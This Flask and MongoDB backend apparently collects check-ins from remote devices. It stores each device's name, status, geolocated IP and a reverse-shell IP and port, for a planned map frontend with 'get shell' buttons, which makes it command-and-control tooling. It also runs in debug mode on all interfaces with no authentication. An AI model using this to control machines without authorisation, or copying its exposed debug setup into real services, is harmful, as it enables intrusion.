import json
import requests

from flask_cors import CORS
from random import randint
from mongo_handler import * 
from datetime import datetime
from flask import Flask, request





app = Flask(__name__)
CORS(app)


"""

Debe de haber un endpoint para actualizar los datos del dispositivo cada x tiempo, además se tiene que ver que si en x minutos 
no se ha recibido señal de dicho dispositivo se da por "apagado" (status a Off). También debe de haber otro endpoint para que
el front se comunique con el backend y le pida los ultimos datos de cualquier dispositivo y cosas así. 

La base de datos (en MongoDB) guardará los datos para cada dispositivo y permitirá obtenerlos o cambiarlos.

Los datos del dispositivo son: 
    - Status: On/Off (Por defecto siempre será On)
    - IP
    - Nombre
    - Time Stamp del mensaje


El frontend deberá plotear geográficamente las IP de cada dispositivo, así como poner uno u otro icono (según Off, On) 
y botones para obtener shell

"""

def locateIP(ip):
    
    try:
        #If its an external IP
        json_repsonse = json.loads(requests.get("https://ipinfo.io/{}/json".format(ip)).text)
        return {"coordinates":[json_repsonse["loc"].split(",")]}
    
    except:
        #If its a local IP, randomize the coordinates.         
        RandomCoordinates = {"0":["40.08828","-35.10374"], "1":["-7.77712","75.04758"],"2":["-35.16760", "128.96533"], "3":["45.32390", "35.99458"]}
        return {"coordinates":RandomCoordinates[str(randint(0,3))]}


@app.route('/')
def index():
    return "Pagina principal"


@app.route('/getNames', methods=['GET'])
def getNames():
    return getDevicesNames()


@app.route('/getCoordinates', methods=['GET'])
def getCoordinatesFromDB():
    return getCoordinates()


@app.route('/getDeviceInfo', methods=['GET'])
def getDevice():
    name = request.args.get("name")
    if name:
        return getDeviceInfo(name)
    else: 
        return "ERROR no name provided"


@app.route('/update', methods=['POST'])
def update():

    try:
        info = request.get_json()

        ip = request.remote_addr

        info.update({"ip":ip})
        info.update(locateIP(info["ip"]))
        info.update({"time":str(datetime.now())})

        insertInfo(info)
    
        return "OK"

    except: 
        print(request.get_json())
        return "Problems getting JSON"


@app.route('/updateGet', methods=['GET'])
def updateGet():

    try: 
        ip = request.remote_addr
        info = {}

        info.update({"name":request.args.get("name")})
        info.update({"status":request.args.get("status")})
        info.update({"shell":[request.args.get("shellIP"), request.args.get("shellPort")]})
        info.update({"ip":ip})
        info.update(locateIP(info["ip"]))
        info.update({"time":str(datetime.now())})

        insertInfo(info)

        return "OK"
    
    except: 
        return "ERROR"



if __name__ == '__main__':

    app.run(debug=True, host="0.0.0.0", port=5000)